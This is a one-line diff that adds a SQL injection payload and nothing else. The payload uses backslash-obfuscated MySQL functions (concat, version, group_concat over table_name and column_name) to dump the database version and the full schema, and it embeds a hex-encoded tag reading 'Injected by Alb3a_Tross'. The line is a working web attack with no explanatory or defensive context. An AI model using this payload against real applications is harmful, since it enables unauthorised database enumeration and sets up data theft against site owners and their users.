@@ -1,0 +1,1 @@
+con\cat(vers\ion(),0x20\ 0x2713496e6a656374656420627920416c6233615f54726f73733c62723e,group_conc\at(t\able_name,0x2e,c\olumn_name SEPARATOR 0x3c\62723e))
